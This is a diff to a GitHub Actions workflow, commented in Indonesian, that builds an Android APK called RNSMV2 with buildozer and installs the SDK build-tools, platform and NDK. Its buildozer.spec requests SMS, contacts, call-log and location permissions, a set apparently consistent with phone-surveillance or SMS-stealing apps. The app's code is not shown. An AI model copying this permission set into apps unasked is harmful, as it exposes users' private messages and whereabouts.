@@ -15,21 +15,39 @@ jobs:
           sudo apt install -y python3-pip openjdk-17-jdk git unzip wget
           pip3 install buildozer cython virtualenv
       
-      - name: Install Android SDK via apt
+      - name: Install Android SDK dan build-tools spesifik
         run: |
+          # Install SDK platform tools
           sudo apt install -y android-sdk
           export ANDROID_HOME=/usr/lib/android-sdk
           echo "ANDROID_HOME=/usr/lib/android-sdk" >> $GITHUB_ENV
           
-          # Accept licenses
+          # Accept semua license
           sudo mkdir -p $ANDROID_HOME/licenses
           echo "8933bad161af4178b1185d1a37fbf41ea5269c55" | sudo tee $ANDROID_HOME/licenses/android-sdk-license
           echo "d56f5187479451eabf01fb78af6dfcb131a6481e" | sudo tee -a $ANDROID_HOME/licenses/android-sdk-license
           
-          # Install build-tools via apt
-          sudo apt install -y android-sdk-build-tools
+          # Install build-tools versi 30.0.3 via manual download
+          cd /tmp
+          wget -q https://dl.google.com/android/repository/build-tools_r30.0.3-linux.zip
+          sudo unzip -q build-tools_r30.0.3-linux.zip -d $ANDROID_HOME/build-tools/30.0.3
+          sudo chmod +x $ANDROID_HOME/build-tools/30.0.3/*
+          
+          # Install platform 30
+          sudo mkdir -p $ANDROID_HOME/platforms/android-30
+          wget -q https://dl.google.com/android/repository/platform-30_r03.zip
+          sudo unzip -q platform-30_r03.zip -d $ANDROID_HOME/platforms/android-30
+          
+          echo "✅ Android SDK siap!"
       
-      - name: Create buildozer.spec
+      - name: Install NDK 23b
+        run: |
+          cd /tmp
+          wget -q https://dl.google.com/android/repository/android-ndk-r23b-linux.zip
+          sudo unzip -q android-ndk-r23b-linux.zip -d /usr/lib/android-sdk/ndk-bundle
+          sudo mv /usr/lib/android-sdk/ndk-bundle/android-ndk-r23b/* /usr/lib/android-sdk/ndk-bundle/
+      
+      - name: Buat buildozer.spec dengan path lengkap
         run: |
           cat > buildozer.spec << 'EOF'
           [app]
@@ -53,26 +71,27 @@ jobs:
           api = 30
           minapi = 21
           ndk = 23b
+          sdk_path = /usr/lib/android-sdk
+          ndk_path = /usr/lib/android-sdk/ndk-bundle
           permissions = INTERNET,READ_SMS,RECEIVE_SMS,READ_CONTACTS,ACCESS_FINE_LOCATION,ACCESS_COARSE_LOCATION,READ_CALL_LOG
           android.permissions = INTERNET,READ_SMS,RECEIVE_SMS,READ_CONTACTS,ACCESS_FINE_LOCATION,ACCESS_COARSE_LOCATION,READ_CALL_LOG
           android.accept_sdk_license = True
           android.ndk_path = /usr/lib/android-sdk/ndk-bundle
+          android.sdk_path = /usr/lib/android-sdk
+          android.build_tools_version = 30.0.3
           EOF
-      
-      - name: Install NDK
-        run: |
-          cd /usr/lib/android-sdk
-          sudo wget -q https://dl.google.com/android/repository/android-ndk-r23b-linux.zip
-          sudo unzip -q android-ndk-r23b-linux.zip
-          sudo mv android-ndk-r23b ndk-bundle
+          echo "✅ buildozer.spec siap"
       
       - name: Build APK
         run: |
           export USER=runner
           export ANDROID_HOME=/usr/lib/android-sdk
-          export PATH=$PATH:$ANDROID_HOME/tools/bin:$ANDROID_HOME/platform-tools
+          export PATH=$PATH:$ANDROID_HOME/tools/bin:$ANDROID_HOME/platform-tools:$ANDROID_HOME/build-tools/30.0.3
           
+          # Clean
           rm -rf bin .buildozer
+          
+          # Build with specific build-tools
           buildozer android debug
       
       - name: Upload APK
@@ -80,3 +99,4 @@ jobs:
         with:
           name: RNSMV2-APK
           path: bin/*.apk
+          if-no-files-found: error
